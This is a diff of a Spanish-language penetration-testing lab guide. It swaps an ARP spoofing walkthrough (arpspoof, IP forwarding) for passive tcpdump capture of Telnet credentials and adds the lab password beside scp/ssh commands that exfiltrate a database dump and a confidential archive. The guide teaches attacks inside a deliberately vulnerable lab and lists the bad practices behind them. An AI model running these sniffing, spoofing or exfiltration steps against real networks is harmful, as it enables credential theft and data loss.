@@ -395,7 +395,7 @@ El atacante no necesita montar ninguna infraestructura externa: el phishing se s
 
 **Ejecutar desde `external-kali`:**
 
-Lo recomendable para hacerlo más visual todo es hacerlo desde la interfaz gráfica del external-kali abriendo el navegador firefox y usar la URL http://192.168.57.10:8080.
+Lo recomendable para hacerlo más visual todo es hacerlo desde la interfaz gráfica del external-kali abriendo el navegador firefox y usar la URL http://192.168.57.10:8080 dentro de http://localhost:8082/vnc.html.
 
 ```bash
 # Ver la página de phishing
@@ -438,80 +438,43 @@ cat /var/log/phishing.log
 - Escritura de credenciales en texto plano en un archivo de log sin protección.
 - Acceso SSH con credencial débil que permite al atacante recolectar los logs.
 
-## 5.4 Ataques de red: ARP Spoofing y captura de tráfico
+## 5.4 Ataques de red: captura de tráfico Telnet
 
 ### Contexto
 
-ARP Spoofing (o envenenamiento ARP) es un ataque de red que consiste en falsificar mensajes ARP para asociar la dirección MAC del atacante con la IP de otro equipo legítimo. Una vez logrado, el atacante se sitúa en medio de la comunicación entre dos dispositivos (Man-in-the-Middle) y puede interceptar, leer y modificar el tráfico.
+Telnet es un protocolo que transmite toda la sesión, incluyendo nombres de usuario y contraseñas, en texto plano y sin ningún tipo de cifrado. Cualquier dispositivo que pueda interceptar el tráfico de red entre el cliente y el servidor puede leer las credenciales directamente.
 
-En este laboratorio, el atacante en la red externa puede ejecutar ARP spoofing contra la DMZ y el firewall para capturar tráfico que de otra forma no vería, como las credenciales Telnet.
+En este laboratorio, el atacante se encuentra en el mismo segmento de red que la DMZ gracias a la ausencia de filtrado del firewall. Esto le permite capturar el tráfico Telnet sin necesidad de técnicas activas como ARP spoofing.
 
-### ¿Por qué es posible este ataque?
+### Captura pasiva con `tcpdump`
 
-ARP es un protocolo de resolución de direcciones sin autenticación. Por diseño, cualquier host puede responder a una solicitud ARP, incluso si la IP no le pertenece. En redes modernas, existen protecciones como DAI (Dynamic ARP Inspection) o switches gestionados, pero en este laboratorio no hay ninguna.
+Se necesitan dos terminales en `external-kali`: una para generar el tráfico Telnet y otra para capturarlo.
 
-Además, el firewall tiene `rp_filter` desactivado y `accept_redirects` habilitado, lo que facilita la suplantación y el desvío de tráfico.
-
-### Ejecución del ataque
-
-El ataque se realiza desde `external-kali` contra los hosts de la red DMZ. Se necesitan dos terminales: una para envenenar las tablas ARP y otra para capturar el tráfico.
-
-**Paso 1: habilitar forwarding**
-
-El atacante debe permitir que el tráfico pase a través de su máquina para que las víctimas no pierdan conectividad y no sospechen.
+**Terminal 1 — Captura del tráfico:**
 
 ```bash
 # Ejecutar desde external-kali
-sudo sysctl -w net.ipv4.ip_forward=1
-```
-
-**Paso 2: iniciar el envenenamiento ARP**
-
-Se envenenan simultáneamente las tablas ARP del `dmz-server` y del `firewall`, haciendo creer a cada uno que la MAC del atacante es la del otro.
-
-```bash
-# Ejecutar desde external-kali
-
-# Terminal 1: envenenar ARP del dmz-server diciendo que somos el firewall
-sudo arpspoof -i eth1 -t 192.168.57.10 192.168.57.1 &
-
-# Terminal 2: envenenar ARP del firewall diciendo que somos el dmz-server
-sudo arpspoof -i eth1 -t 192.168.57.1 192.168.57.10 &
-```
-
-**Salida esperada en cada terminal:**
-
-```text
-8:15:22.123456 00:1a:2b:3c:4d:5e 00:0c:29:aa:bb:cc 0806 42: arp reply 192.168.57.1 is-at 00:1a:2b:3c:4d:5e
-8:15:23.234567 00:1a:2b:3c:4d:5e 00:0c:29:aa:bb:cc 0806 42: arp reply 192.168.57.1 is-at 00:1a:2b:3c:4d:5e
-```
-
-Cada línea representa un paquete ARP falsificado enviado a la víctima. El atacante repite continuamente la mentira para que las tablas ARP no expiren.
-
-**Paso 3: capturar tráfico Telnet**
-
-Mientras el envenenamiento está activo, el tráfico entre el `dmz-server` y el `firewall` pasa por la máquina atacante. Ahora se puede capturar cualquier comunicación en texto claro, como Telnet.
-
-```bash
-# Ejecutar desde external-kali (en otra terminal)
 sudo tcpdump -i eth1 -A -s0 port 23
 ```
 
-**Paso 4: generar tráfico Telnet**
-
-En otra terminal, o esperando a que un usuario legítimo lo haga, se inicia una sesión Telnet:
+**Terminal 2 — Generación de tráfico Telnet:**
 
 ```bash
-# Ejecutar desde external-kali (o desde cualquier máquina de la red)
+# Ejecutar desde external-kali
 telnet 192.168.57.10
-# Iniciar sesión con ftpoperator / ftpoperator
 ```
 
-**Salida esperada en tcpdump (fragmento):**
+Cuando aparezca el prompt de login, se introducen las credenciales:
 
 ```text
-09:30:15.123456 IP 192.168.57.10.telnet > 192.168.57.1.34567: Flags [P.], seq 1:20, ack 1, win 229, length 19
-E..;..@.@........9...e...P...;.........
+dmz-server login: ftpoperator
+Password: ftpoperator
+```
+
+**Salida esperada en la Terminal 1 (fragmento relevante):**
+
+```text
+09:30:15.123456 IP external-kali.45678 > dmz-server.telnet: ...
 Ubuntu 22.04.5 LTS
 dmz-server login: f
 t
@@ -537,28 +500,14 @@ o
 r
 ```
 
-**Interpretación**: aunque Telnet ya transmite en claro de por sí, el ARP spoofing permite capturar este tráfico incluso si el atacante no está en el mismo segmento que la víctima o el servidor. Las credenciales aparecen carácter por carácter en la captura, legibles sin ninguna herramienta de descifrado.
-
-**Paso 5: detener el ataque**
-
-Para restaurar el funcionamiento normal de la red:
-
-```bash
-# Ejecutar desde external-kali
-sudo killall arpspoof
-sudo killall tcpdump
-sudo sysctl -w net.ipv4.ip_forward=0
-```
+**Interpretación**: las credenciales aparecen en texto claro, carácter por carácter, en la salida de `tcpdump`. Esto demuestra que cualquier sesión Telnet puede ser interceptada y leída sin necesidad de herramientas avanzadas de descifrado. En un entorno real, un atacante que consiga situarse en la red podría capturar las credenciales de cualquier usuario que utilice Telnet.
 
 #### Malas prácticas que habilitan este ataque
 
-- `rp_filter` desactivado en el firewall, lo que permite tráfico con IP de origen falsificada.
-- `accept_redirects` y `send_redirects` habilitados, facilitando la manipulación de rutas.
-- Sin protección ARP a nivel de switch (DAI, DHCP Snooping) ni de firewall.
-- Telnet transmite credenciales sin cifrar, haciendo que la captura sea directamente legible.
-- Sin IDS/IPS que detecte paquetes ARP sospechosos o actividad de envenenamiento.
-
----
+- Uso de Telnet en lugar de SSH para acceso remoto.
+- Transmisión de credenciales sin cifrado.
+- Ausencia de segmentación que impida a un atacante en la red externa ver el tráfico de la DMZ.
+- Sin IDS/IPS que detecte actividad de captura de tráfico.
 
 ## 5.5 Exfiltración de datos
 
@@ -612,6 +561,8 @@ El atacante usa las credenciales ya conocidas para transferir los archivos al `d
 # Transferir el dump de MySQL a la DMZ
 scp /tmp/corporativedb.sql ftpoperator@192.168.57.10:/tmp/
 
+#contraseña: ftpoperator
+
 # Transferir el archivo comprimido de Samba a la DMZ
 scp /tmp/confidential.tar.gz ftpoperator@192.168.57.10:/tmp/
 ```
@@ -632,6 +583,8 @@ Una vez los archivos están en la DMZ, el atacante puede descargarlos desde `ext
 ```bash
 # Conectar al dmz-server con las credenciales ya conocidas
 ssh ftpoperator@192.168.57.10
+
+#contraseña: ftpoperator
 
 # Dentro del dmz-server, verificar que los archivos están
 ls -lh /tmp/*.sql /tmp/*.tar.gz
